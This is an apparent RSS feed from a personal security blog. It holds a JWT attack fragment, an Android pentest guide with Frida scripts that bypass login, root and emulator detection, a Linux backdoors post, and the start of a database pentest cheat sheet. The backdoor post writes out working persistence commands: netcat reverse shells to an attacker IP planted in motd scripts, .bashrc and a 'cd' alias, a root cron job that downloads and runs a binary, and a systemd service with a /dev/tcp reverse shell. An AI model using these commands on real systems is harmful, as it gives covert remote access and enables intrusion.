<li><code>JKU</code> : TÃªn Ä‘áº§y Ä‘á»§ cá»§a lÃ  &ldquo;JSON Web Key Set URL&rdquo;, Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ chá»‰ Ä‘á»‹nh má»™t táº­p há»£p cÃ¡c URL Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xÃ¡c minh jwt. TÆ°Æ¡ng tá»± <code>kid</code>,tá»« <code>JKU</code> ngÆ°á»i dÃ¹ng cÅ©ng cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh dá»¯ liá»‡u Ä‘áº§u vÃ o. Náº¿u dá»¯ liá»‡u Ä‘Ã³ khÃ´ng Ä‘Æ°á»£c lá»c cháº·t cháº½, báº¡n cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh má»™t táº­p há»£p cÃ¡c tá»‡p khÃ³a tÃ¹y chá»‰nh vÃ  chá»‰ Ä‘á»‹nh ráº±ng á»©ng dá»¥ng web sá»­ dá»¥ng táº­p há»£p khÃ³a Ä‘á»ƒ xÃ¡c minh jwt.</li>
<li><code>X5U</code> : Cho phÃ©p káº» táº¥n cÃ´ng chá»‰ Ä‘á»‹nh chá»©ng chá»‰ khÃ³a cÃ´ng khai hoáº·c chuá»—i chá»©ng chá»‰ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xÃ¡c minh jwt, tÆ°Æ¡ng tá»± nhÆ° <code>JKU</code> phÆ°Æ¡ng phÃ¡p khai thÃ¡c táº¥n cÃ´ng.</li>
</ul>
<h3 id="cac-phuong-phap-khac">Cac phuong phap khac</h3>
<ul>
<li>JWT Ä‘áº£m báº£o tÃ­nh toÃ n váº¹n hÆ¡n lÃ  tÃ­nh báº£o máº­t trong quÃ¡ trÃ¬nh truyá»n dá»¯ liá»‡u.</li>
<li>VÃ¬ payload Ä‘Æ°á»£c encode base64url nÃªn nÃ³ tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i truyá»n báº£n rÃµ. Náº¿u payload mang thÃ´ng tin nháº¡y cáº£m (cháº³ng háº¡n nhÆ° Ä‘Æ°á»ng dáº«n tá»‡p nÆ¡i lÆ°u trá»¯ cáº·p khÃ³a) vÃ  pháº§n payload Ä‘Æ°á»£c base64url decode , thÃ¬ thÃ´ng tin Ä‘Æ°á»£c mang trong payload cÃ³ thá»ƒ Ä‘Æ°á»£c Ä‘á»c .</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Androi pentest part 1</title>
            <link>https://tranquac.github.io/posts/2021/07/androi-pentest-part-1/</link>
            <pubDate>Wed, 21 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tranquac.github.io/posts/2021/07/androi-pentest-part-1/</guid>
            <description>Concept Decompile and compile Using Adb and Frida interact Android  Concept Structure  AndroidManifest file contains the applicationâ€™s structure Res folder contains all the resources that the application needs to run , including user interface layout, icons, audio, etc. The most interesting files for us are the classes.dex files because they are the compiled java files. The .dex extension stands for Dalvik EXecutable. So we need to decompile these dex files to get the java classes.</description>
            <content type="html"><![CDATA[<ul>
<li><a href="#concept">Concept</a></li>
<li><a href="#decompile-and-compile">Decompile and compile</a></li>
<li><a href="#using-adb-and-frida-interact-android">Using Adb and Frida interact Android</a></li>
</ul>
<h2 id="concept">Concept</h2>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/1.png" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/1.png">
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/2.png" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/2.png"></p>
<h4 id="structure">Structure</h4>
<ul>
<li><strong>AndroidManifest file</strong> contains the applicationâ€™s structure</li>
<li><strong>Res folder</strong> contains all the resources that the application needs to run , including user interface layout, icons, audio, etc.</li>
<li><strong>The most interesting files for us are the classes.dex files</strong> because they are the compiled java files. The .dex extension stands for Dalvik EXecutable. So we need to decompile these dex files to get the java classes.</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li><strong>Apktool</strong> : tool for reverse engineering Android apk files. In this case we are using to extract files from apk and rebuild.</li>
<li><strong>Keytool</strong> : Java tool for creating keys/certs, that comes with the JDK.</li>
<li><strong>Jarsigner</strong> : Java tool for signing JAR/APK files, that comes with the JDK.</li>
<li><strong>Zipalign</strong> : archive alignment tool, that comes with the Android SDK.</li>
<li><strong>JD-GUI</strong> : To view java code.</li>
<li><strong>dex2jar</strong> : Converts Android dex files to class/jar files.</li>
<li><strong>MobSF</strong> : Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing.</li>
<li><strong>Adb</strong> : is a versatile command-line tool that lets you communicate with a device.</li>
<li><strong>Frida</strong> : Dynamic Binary Instrumentation tool.</li>
<li><strong>How to Frida work?</strong> : Frida is writing code directly in process memory. When you attach frida to a running application, frida on the background uses ptrace to hijack the thread. A bootstrapper populates this thread and starts a new one, connecting to the frida server that is running on the device and loads a dynamically generated library that has the frida agent along with our instrumentation code. This last part is where all the magic happens. The hijacked thread is being restored to its original state and resumes, then the process continues normally. (<a href="https://erev0s.com/blog/frida-code-snippets-for-android/)">https://erev0s.com/blog/frida-code-snippets-for-android/)</a>.</li>
<li><strong>APKLab</strong> : extension VSCode for apk (good).</li>
</ul>
<h2 id="decompile-and-compile">Decompile and compile</h2>
<h4 id="unpack-file-apk">Unpack file apk</h4>
<p><code>unzip application.apk</code></p>
<h4 id="to-decompile-an">To decompile an</h4>
<p><code>apktool d -r -s application.apk</code><br>
or<br>
<code>apktool d application.apk</code><br>
or<br>
<code>java -jar Bytecode-Viewer-2.10.12.jar -&gt; load apk file</code><br>
or<br>
<code>using extension ApkLap in Visual Studio Code</code><br>
or<br>
<code>using jadx</code> (<a href="https://github.com/skylot/jadx/releases/download/v1.2.0/jadx-gui-1.2.0-no-jre-win.exe">https://github.com/skylot/jadx/releases/download/v1.2.0/jadx-gui-1.2.0-no-jre-win.exe</a>)</p>
<h4 id="convert-the-dex-files-into-standard-class-files">Convert the Dex files into standard class files</h4>
<p><code>sh d2j-dex2jar.sh application/classes.dex </code><br>
(classes.dex have from unzip application)</p>
<h4 id="use-the-jd-java-decompiler-to-inspect-the-source">Use the JD (Java Decompiler) to inspect the source</h4>
<p><code>java -jar jd-gui.jar classes-dex2jar.jar</code><br>
or<br>
<code>java -jar recaf-2.20.1-J8-jar-with-dependencies.jar --input=classes-dex2jar.jar</code>\</p>
<ul>
<li>Once you have made your changes, you need to repack the APK. This will create a my_application.apkfile:</li>
</ul>
<h4 id="to-recompilebuild-the-apk">To recompile(build) the apk</h4>
<ul>
<li>After modify apk file (smili code,&hellip;) you can recompile apk app<br>
<code>apktool b -f -d application</code></li>
<li>or<br>
<code>using APKLap in VSCode (https://github.com/APKLab/APKLab)</code></li>
<li>After recompiling (building) the apk the new apk will be generated in Dist folder.(using apk tools)</li>
<li>New apk save in : Application -&gt; Dist -&gt;  application.apk</li>
<li>The APK must be signed before you run on your device.</li>
<li>Before signing an apk, create a key if you donâ€™t have an existing one. If prompted for a password, create your own password.\</li>
<li><strong>To generate a key</strong><br>
<code>keytool -genkey -v -keystore my-release-key.keystore -alias alias_name  -keyalg RSA -keysize 2048 -validity 10000</code></li>
<li><strong>Sign the apk</strong><br>
<code>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name</code></li>
<li><strong>Verify apk (Option)</strong><br>
<code>jarsigner -verify -verbose -certs my_application.apk</code></li>
<li>Finally, the apk must be aligned for optimal loading:<br>
<code>./zipalign -v 4 my_application.apk my_application-aligned.apk</code></li>
<li>You have a my_application-aligned.apk file, which you can install onto your device.</li>
</ul>
<h2 id="using-adb-and-frida-interact-android">Using Adb and Frida interact Android</h2>
<h4 id="adb">Adb</h4>
<ul>
<li><code>adb devices</code> : list devices</li>
<li><code>adb connect IP:Port</code> : connect to devices</li>
<li><code>adb shell</code> : spawn shell</li>
<li><code>adb root</code> : run with root user</li>
<li><code>adb backup -apk -shared com.android.insecurebankv2</code> (android:allowBackup=&ldquo;true&rdquo; in AndroidMainfest.xml) : backup apk file</li>
<li><code>cat backup.ab</code> | ( dd bs=24 count=0 skip=1; cat) | zlib-flate-uncompress &gt; backup.tar : read backup file</li>
</ul>
<h4 id="frida">Frida</h4>
<ul>
<li><code>wget https://github.com/frida/frida/releases/download/15.0.0/frida-inject-15.0.0-android-x86.xz</code> : download</li>
<li><code>adb push frida-server /data/local/tmp</code> : push Frida server to Androi</li>
<li><code>adb shell &quot;chmod 755 /data/local/tmp/frida-server&quot;</code>: set permission Frida binari</li>
<li><code>adb shell &quot;/data/local/tmp/frida-server&quot; &amp;</code> : run Frida-server in Android</li>
<li><code>Frida-ps -U</code> : list running process</li>
<li><code>Frida-ps -aU | grep -i &quot;name&quot;</code> : check process name</li>
</ul>
<h4 id="example-frida">Example Frida</h4>
<p><strong>Login bypass</strong></p>
<ul>
<li>APP : Sieve (download apk -&gt; adb install sieve.apk)</li>
<li>A function named â€œcheckKeyResultâ€. If the boolean value is true, the application redirects the flow to loginSuccessful() function if false then to loginFailed(). 
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/3.png" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/3.png"></li>
<li>Frida has support for binding with multiple languages like Python,C,.NET and Swift. However, we are using python to demonstrate the bypass</li>
<li>Check process name : <code>frida-ps -aU | grep -i &quot;sieve&quot;</code></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">perform</span>(<span style="color:#66d9ef">function</span> () {
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;com.mwr.example.sieve.MainLoginActivity&#39;</span>); <span style="color:#75715e">//Obtain referrence of the Activity currently running
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">MainActivity</span>.<span style="color:#a6e22e">checkKeyResult</span>.<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">b</span>) { <span style="color:#75715e">//Obtain reference of the function whcih needs to be called
</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;checkKeyResult&#39;</span>);
        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">checkKeyResult</span>(<span style="color:#66d9ef">true</span>); <span style="color:#75715e">//Calling the function and passing the boolean parameter as true
</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Done:&#39;</span>);
    };
});
</code></pre></div><ul>
<li>Run: <code>frida -U --no-pause -l bypass.js -f appname</code><br>
<strong>Check root bypass</strong></li>
<li>APP : bankinsecurev2 (download apk -&gt; adb install bankinsecurev2.apk)</li>
<li>The application uses two functions to check whether the device is rooted or not as shown below in the decompiled APK of the InsecureBank app: doesSUexist, doesSuperuserApkExist
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/5.png" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/5.png"></li>
<li>Script bypass:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">perform</span>(<span style="color:#66d9ef">function</span> () {
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;com.android.insecurebankv2.PostLogin&#39;</span>);
    <span style="color:#a6e22e">MainActivity</span>.<span style="color:#a6e22e">doesSUexist</span>.<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Done: doesSUexist&#39;</span>);
		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
    };
	
	<span style="color:#a6e22e">MainActivity</span>.<span style="color:#a6e22e">doesSuperuserApkExist</span>.<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">b</span>) {
        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Done: doesSuperuserApkExist&#39;</span>);
		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
    };
});
</code></pre></div><ul>
<li>Running: <code>frida -U --no-pause -l bypass.js -f appname</code><br>
<strong>Real world</strong></li>
<li>Check emulator:<br>
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/7.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/7.PNG"></li>
<li>In class StringUtil
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/9.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/9.PNG"></li>
<li>Check root:<br>
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/8.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/8.PNG"></li>
<li>In class RootUtil
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/10.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/androi/10.PNG"></li>
<li>Bypass check emulator and root (overload 2 method a() in StringUtil and a() in RootUtil):\</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">perform</span>(<span style="color:#66d9ef">function</span>(){
    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;\nBypass emulator detection&#39;</span>);
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">StringUtil</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;package.name&#39;</span>);
    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;\nHijacking a() function in StringUtil class&#39;</span>);
    <span style="color:#a6e22e">StringUtil</span>.<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">overload</span>(<span style="color:#e6db74">&#39;java.lang.String&#39;</span>).<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){
        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;\nInside the a() function&#39;</span>);
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
    };
    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;\nEmulator detection bypassed&#39;</span>);


    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;\nBypass root detection&#39;</span>);
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">RootUtil</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;package.name&#39;</span>);
    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;\nHijacking a() function in RootUtil class&#39;</span>);
    <span style="color:#a6e22e">RootUtil</span>.<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">overload</span>(<span style="color:#e6db74">&#39;android.content.Context&#39;</span>).<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){
        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;\nInside the a() function&#39;</span>);
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
    };
    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;\nRoot detection bypassed&#39;</span>);
});
</code></pre></div><ul>
<li>Running: <code>frida -U --no-pause -l bypass.js -f appname</code></li>
</ul>
<h2 id="refer">Refer</h2>
<p><a href="https://frida.re/docs">https://frida.re/docs</a><br>
<a href="https://11x256.github.io/Frida-hooking-android-part-1/">https://11x256.github.io/Frida-hooking-android-part-1/</a><br>
<a href="https://11x256.github.io/Frida-hooking-android-part-2/">https://11x256.github.io/Frida-hooking-android-part-2/</a></p>
<!-- raw HTML omitted -->
]]></content>
        </item>
        
        <item>
            <title>Linux backdoors</title>
            <link>https://tranquac.github.io/posts/2021/06/linux-backdoors/</link>
            <pubDate>Mon, 28 Jun 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tranquac.github.io/posts/2021/06/linux-backdoors/</guid>
            <description>Trong thá»±c táº¿ khi cÃ³ quyá»n truy cáº­p vÃ o má»¥c tiÃªu(SSH, VNC, interactive shell &amp;hellip;) thÃ¬ viá»‡c Ä‘á»ƒ láº¡i backdoor lÃ  má»™t pháº§n quan trá»ng Ä‘á»ƒ duy trÃ¬ quyá»n truy cáº­p vÃ o há»‡ thá»‘ng má»¥c tiÃªu. Do Ä‘Ã³, viá»‡c há»c má»™t sá»‘ ká»¹ thuáº­t backdoor lÃ  Ä‘iá»u cáº§n thiáº¿t, khÃ´ng chá»‰ Ä‘á»‘i vá»›i nhá»¯ng káº» táº¥n cÃ´ng mÃ  cáº£ nhá»¯ng ngÆ°á»i phÃ²ng thá»§. Sau Ä‘Ã¢y chÃºng ta sáº½ tÃ¬m hiá»ƒu má»™t sá»‘ kÄ© thuáº­t backdoor thÃ´ng dá»¥ng.</description>
            <content type="html"><![CDATA[<p>Trong thá»±c táº¿ khi cÃ³ quyá»n truy cáº­p vÃ o má»¥c tiÃªu(SSH, VNC, interactive shell &hellip;) thÃ¬ viá»‡c Ä‘á»ƒ láº¡i backdoor lÃ  má»™t pháº§n quan trá»ng Ä‘á»ƒ duy trÃ¬ quyá»n truy cáº­p vÃ o há»‡ thá»‘ng má»¥c tiÃªu. Do Ä‘Ã³, viá»‡c há»c má»™t sá»‘ ká»¹ thuáº­t backdoor lÃ  Ä‘iá»u cáº§n thiáº¿t, khÃ´ng chá»‰ Ä‘á»‘i vá»›i nhá»¯ng káº» táº¥n cÃ´ng mÃ  cáº£ nhá»¯ng ngÆ°á»i phÃ²ng thá»§. Sau Ä‘Ã¢y chÃºng ta sáº½ tÃ¬m hiá»ƒu má»™t sá»‘ kÄ© thuáº­t backdoor thÃ´ng dá»¥ng. á» Ä‘Ã¢y chÃºng ta chá»‰ tháº£o luáº­n trong tháº¿ giá»›i Linux!</p>
<h3 id="backdoor-lÃ -gÃ¬">Backdoor lÃ  gÃ¬?</h3>
<p>Backdoor lÃ  má»™t Ä‘oáº¡n mÃ£ áº©n, script hay chÆ°Æ¡ng trÃ¬nh Ä‘áº·t trÃªn mÃ¡y má»¥c tiÃªu phá»¥c vá»¥ cho má»¥c Ä‘Ã­ch truy cáº­p dÃ i háº¡n vÃ o má»¥c tiÃªu cá»§a káº» táº¥n cÃ´ng,vá»›i Ä‘iá»u Ä‘Ã³ báº¡n khÃ´ng pháº£i khai thÃ¡c cÃ¹ng má»™t há»‡ thá»‘ng hai láº§n. NÃ³ chá»‰ Ä‘Æ¡n giáº£n lÃ  cung cáº¥p cho báº¡n quyá»n truy cáº­p nhanh hÆ¡n vÃ  tá»©c thÃ¬ vÃ o há»‡ thá»‘ng.</p>
<h3 id="1-ssh-keys">1. SSH Keys</h3>
<p>SSH authorized_keys táº­p tin chá»©a má»™t danh sÃ¡ch cÃ¡c á»§y quyá»n ngÆ°á»i dÃ¹ng / khÃ³a cÃ´ng khai Ä‘Æ°á»£c phÃ©p Ä‘Äƒng nháº­p vÃ o má»™t tÃ i khoáº£n cá»¥ thá»ƒ. Trong tá»‡p nÃ y, nhá»¯ng káº» táº¥n cÃ´ng cÅ©ng cÃ³ thá»ƒ Ä‘áº·t cÃ¡c khÃ³a cÃ´ng khai cá»§a chÃºng Ä‘á»ƒ tá»± cáº¥p quyá»n vÃ  truy cáº­p ngay vÃ o há»‡ thá»‘ng thÃ´ng qua SSH.\</p>
<h4 id="victim">Victim</h4>
<p><code>ssh-keygen -t rsa</code><br>
-&gt; generate key pair<br>
<code>cat /$(whoami)/.ssh/id_rsa.pub &gt; /$(whoami)/.ssh/authorized_keys</code><br>
-&gt; copy public key (id_rsa.pub) to authorized_keys</p>
<h4 id="attacker">Attacker</h4>
<p>Copy private key (id_rsa)<br>
<code>chmod 600 id_rsa</code><br>
-&gt; set permission<br>
<code>ssh -i id_rsa username@victim</code><br>
-&gt; ssh to victim<br>
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG"></p>
<h3 id="2-ssh-motd">2. SSH motd</h3>
<p>motd (Tin nháº¯n trong ngÃ y) lÃ  banner xuáº¥t hiá»‡n khi báº¡n Ä‘Äƒng nháº­p vÃ o mÃ¡y báº±ng SSH. Äá»‘i vá»›i Ubuntu / Debian cÃ¡c táº­p lá»‡nh motd cÃ³ thá»ƒ Ä‘Æ°á»£c tÃ¬m tháº¥y táº¡i /etc/update-motd.d. Theo máº·c Ä‘á»‹nh, nhá»¯ng ngÆ°á»i dÃ¹ng khÃ¡c khÃ´ng cÃ³ quyá»n ghi trÃªn thÆ° má»¥c Ä‘Ã³.
<code>cd /etc/update-motd.d &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt; 20-backdoor &amp;&amp; chmod +x 20-backdoor</code><br>
LÆ°u Ã½: &amp; -&gt; run command in background
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG"></p>
<h3 id="3-users-bashrc--interactive-session">3. Userâ€™s .bashrc â€” Interactive session</h3>
<p>.bashrc lÃ  má»™t trong nhá»¯ng táº­p lá»‡nh khá»Ÿi Ä‘á»™ng Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi Bourne shell bash (zsh lÃ  .zshrc). Náº¿u cÃ³ ngÆ°á»i dÃ¹ng sá»­ dá»¥ng bashlÃ m trÃ¬nh bao Ä‘Äƒng nháº­p cá»§a há», thÃ¬ táº­p lá»‡nh sáº½ Ä‘Æ°á»£c thá»±c thi cho má»—i phiÃªn tÆ°Æ¡ng tÃ¡c mÃ  há» khá»Ÿi cháº¡y.<br>
<code>cd &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt;&gt; .bashrc</code><br>
<code>cd &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt;&gt; .zshrc</code><br>
sáº½ nháº­n Ä‘Æ°á»£c reverse shell khi ngÆ°á»i dÃ¹ng sá»­ dá»¥ng lá»‡nh <code>bash</code> hay <code>su username</code>
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG"></p>
<h3 id="4-users-bashrc--aliases">4. Userâ€™s .bashrc â€” Aliases</h3>
<p>LÃ  má»™t káº» táº¥n cÃ´ng, chÃºng ta cÅ©ng cÃ³ thá»ƒ Ä‘áº·t backdoor trong bÃ­ danh cá»§a ngÆ°á»i dÃ¹ng! ÄÃ¢y cÅ©ng lÃ  1 phÆ°Æ¡ng phÃ¡p tÃ´i ráº¥t thÃ­ch.<br>
<code>alias cd='$(nc 192.168.66.105 4444 -e /bin/bash &amp;); cd'</code><br>
-&gt; ChÃºng ta sáº½ nháº­n Ä‘Æ°á»£c reverse shell má»—i khi ngÆ°á»i dÃ¹ng sá»­ dá»¥ng lá»‡nh cd
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG">
DÆ°á»›i Ä‘Ã¢y lÃ  má»™t sá»‘ backdoor phá»©c táº¡p khÃ¡c sá»­ dá»¥ng bÃ­ danh:</p>
<ul>
<li><a href="https://github.com/nisay759/sudo-backdoor">https://github.com/nisay759/sudo-backdoor</a></li>
<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
</ul>
<h3 id="5-cron-jobs">5. Cron jobs</h3>
<p>Cron lÃ  má»™t tÃ­nh nÄƒng tá»« OS like Linux / UNIX cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ thá»±c hiá»‡n Ä‘á»‹nh ká»³ má»™t cÃ´ng viá»‡c hoáº·c nhiá»‡m vá»¥ cá»¥ thá»ƒ giá»‘ng nhÆ° Task Scheduler trong Windows.<br>
<code>echo '* * * * * root cd /tmp; wget 192.168.66.105:8000/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor' &gt; /etc/cron.d/backdoor</code>
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG"></p>
<h3 id="6-backdoor-as-a-service-baas">6. Backdoor as a Service (BaaS)</h3>
<p>Káº» táº¥n cÃ´ng cÅ©ng cÃ³ thá»ƒ táº¡o má»™t backdoor nhÆ° má»™t service (BaaS). ÄÃ¢y lÃ  má»™t vÃ­ dá»¥ vá» BaaS ( backdoor.service):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>Service<span style="color:#f92672">]</span>
Type<span style="color:#f92672">=</span>simple
User<span style="color:#f92672">=</span>root
ExecStart<span style="color:#f92672">=</span>/bin/bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/192.168.66.105/4444 0&gt;&amp;1&#34;</span>
<span style="color:#f92672">[</span>Install<span style="color:#f92672">]</span>
WantedBy<span style="color:#f92672">=</span>multi-user.target
</code></pre></div><p>Khi service Ä‘Æ°á»£c báº¯t Ä‘áº§u, nÃ³ khá»Ÿi cháº¡y má»™t reverse shell cho káº» táº¥n cÃ´ng.<br>
<code>cd /etc/systemd/system &amp;&amp; systemctl start backdoor.service</code><br>
NÃ³ cÅ©ng cÃ³ thá»ƒ Ä‘Æ°á»£c kÃ­ch hoáº¡t khi enable.<br>
<code>cd /etc/systemd/system &amp;&amp; systemctl enable backdoor.service</code>
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG"></p>
]]></content>
        </item>
        
        <item>
            <title>SQL</title>
            <link>https://tranquac.github.io/posts/2021/06/sql/</link>
            <pubDate>Tue, 08 Jun 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tranquac.github.io/posts/2021/06/sql/</guid>
            <description>General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Bad character detect Authen bypass Sql injection bypass filter   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql -host=TARGETIP -u root -p mysql -u root -p password -e &amp;#39;show databases;&amp;#39; mysql -u root -p password DBNAME -e &amp;#39;select * from TABLENAME;&amp;#39; Access Locally: mysql -u root -p mysql&amp;gt; use DBNAME; mysql&amp;gt; show tables; Command Backdoor example: SELECT &amp;#34;&amp;lt;?</description>
            <content type="html"><![CDATA[<ul>
<li><a href="#general">General</a>
<ul>
<li><a href="#mysql-3306">MySQL (3306)</a></li>
<li><a href="#mssql-1433">MSSQL (1433)</a></li>
<li><a href="#oracle-1521">Oracle (1521)</a></li>
<li><a href="#postgressql-5432">PostgresSQL (5432)</a></li>
</ul>
</li>
<li><a href="#sql-injection">SQL Injection</a>
<ul>
<li><a href="#bad-character-detect">Bad character detect</a></li>
<li><a href="#authen-bypass">Authen bypass</a></li>
<li><a href="#sql-injection-bypass-filter">Sql injection bypass filter</a></li>
</ul>
</li>
<li><a href="#sqlmap">SQLMAP</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
<h1 id="general">General</h1>
<h2 id="mysql-3306">MySQL-3306</h2>
<h4 id="nmap">Nmap</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -Pn -sV -p <span style="color:#ae81ff">3306</span> --script mysql* TARGETIP
</code></pre></div><h4 id="access-remotely">Access Remotely:</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">mysql <span style="color:#f92672">-</span><span style="color:#66d9ef">host</span><span style="color:#f92672">=</span>TARGETIP <span style="color:#f92672">-</span>u root <span style="color:#f92672">-</span>p
